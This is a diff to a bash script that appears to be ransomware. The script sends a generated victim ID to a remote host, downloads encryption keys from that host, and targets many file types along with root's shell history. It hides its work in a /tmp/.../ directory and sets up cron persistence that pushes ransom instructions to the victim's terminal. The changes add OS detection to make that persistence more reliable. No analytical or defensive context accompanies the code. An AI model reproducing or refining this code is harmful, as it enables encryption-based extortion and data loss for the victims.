@@ -4,6 +4,16 @@ genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
 curl -d "uniqueID=${genKey}" http://192.168.1.132/target.php &>/dev/null
 
+if [ -f /etc/redhat-release ]
+then
+  osType="redhat"
+elif [ -f /etc/debian_version ]
+then
+  osType="debian"
+else
+  echo "Could not determine OS" &>/dev/null
+fi
+
 fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" \
           "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
           "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" \
@@ -25,8 +35,6 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
 
 mkdir -p /tmp/.../
 cd /tmp/.../
-
-sleep 30
 
 curl http://192.168.1.132:8080/pub.pem > ./pub.pem &>/dev/null
 curl http://192.168.1.132:8080/key.bin > ./key.bin &>/dev/null
@@ -70,7 +78,16 @@ done
 chmod 755 /etc/cron.hourly/instructions.sh
 
 getTTY=$(/usr/bin/tty)
-/usr/bin/crontab -l | { cat; echo "5/* * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - 
+
+if [ "${osType}" == "redhat" ]
+then
+  /usr/bin/crontab -l | { cat; echo "5 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab -
+elif [ "${osType}" == "debian" ]
+then
+  /usr/bin/crontab -l | { cat; echo "5/* * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab -
+else
+  echo "Could not set crontab" &>/dev/null
+fi
 
 /bin/rm -rf  /tmp/.../key.bin
 
